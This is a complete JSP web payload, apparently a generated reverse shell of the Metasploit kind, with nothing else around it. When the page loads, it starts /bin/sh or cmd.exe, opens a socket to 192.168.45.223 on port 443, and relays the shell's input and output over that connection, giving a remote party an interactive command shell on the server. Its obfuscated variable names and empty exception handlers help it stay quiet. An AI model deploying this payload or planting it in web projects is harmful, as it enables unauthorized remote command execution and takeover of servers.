<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wz;
    OutputStream al;

    StreamConnector( InputStream wz, OutputStream al )
    {
      this.wz = wz;
      this.al = al;
    }

    public void run()
    {
      BufferedReader kb  = null;
      BufferedWriter o2K = null;
      try
      {
        kb  = new BufferedReader( new InputStreamReader( this.wz ) );
        o2K = new BufferedWriter( new OutputStreamWriter( this.al ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = kb.read( buffer, 0, buffer.length ) ) > 0 )
        {
          o2K.write( buffer, 0, length );
          o2K.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( kb != null )
          kb.close();
        if( o2K != null )
          o2K.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.45.223", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
